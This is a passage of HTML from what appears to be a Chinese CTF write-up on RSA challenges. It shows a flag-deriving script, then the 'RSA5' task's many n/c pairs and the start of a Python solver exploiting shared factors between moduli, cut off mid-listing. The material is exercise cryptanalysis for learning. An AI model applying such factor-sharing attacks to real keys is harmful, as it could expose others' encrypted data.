class="number">90468539152235033517870318889776271069345640432047835931186781819915963165828770575564631525796216990106105695265730319547795207814485506777675652074071839046853915223503351787031888977627106934564043204783593118678181991596316582877057556463152579621699010610569526573031954779520781448550677767565207407183</span></span><br><span class="line">q = <span class="number">11273732364123571293429600400343309403733952146912318879993851141423284675797325272321856863528776914709992821287788339848962916204774010644058033316303937</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">hex</span> = <span class="built_in">hex</span>(d)+<span class="string">&#x27;L&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>取得flag。</p><h3 id="rsa5"><a class="markdownIt-Anchor" href="#rsa5"></a> RSA5</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = xxxxxxxx</span><br><span class="line">e = 65537</span><br><span class="line">========== n c ==========</span><br><span class="line">n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span><br><span class="line">c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span><br><span class="line"></span><br><span class="line">n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span><br><span class="line">c = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span><br><span class="line"></span><br><span class="line">n = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span><br><span class="line">c = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span><br><span class="line"></span><br><span class="line">n = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span><br><span class="line">c = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span><br><span class="line"></span><br><span class="line">n = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span><br><span class="line">c = 15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span><br><span class="line"></span><br><span class="line">n = 21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span><br><span class="line">c = 20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span><br><span class="line"></span><br><span class="line">n = 25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span><br><span class="line">c = 19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span><br><span class="line"></span><br><span class="line">n = 22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span><br><span class="line">c = 6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span><br><span class="line"></span><br><span class="line">n = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span><br><span class="line">c = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span><br><span class="line"></span><br><span class="line">n = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span><br><span class="line">c = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span><br><span class="line"></span><br><span class="line">n = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span><br><span class="line">c = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span><br><span class="line"></span><br><span class="line">n = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span><br><span class="line">c = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span><br><span class="line"></span><br><span class="line">n = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span><br><span class="line">c = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span><br><span class="line"></span><br><span class="line">n = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span><br><span class="line">c = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span><br><span class="line"></span><br><span class="line">n = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span><br><span class="line">c = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span><br><span class="line"></span><br><span class="line">n = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span><br><span class="line">c = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span><br><span class="line"></span><br><span class="line">n = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span><br><span class="line">c = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span><br><span class="line"></span><br><span class="line">n = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span><br><span class="line">c = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span><br><span class="line"></span><br><span class="line">n = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span><br><span class="line">c = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span><br><span class="line"></span><br><span class="line">n = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span><br><span class="line">c = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span><br></pre></td></tr></table></figure><p>原本以為是共模攻擊，仔細看了一下發現是模不互素，</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> mpz</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c2 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c3 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c4 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c5 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c6 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c7 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c8 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c9 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c10 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c11 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n12 = <span 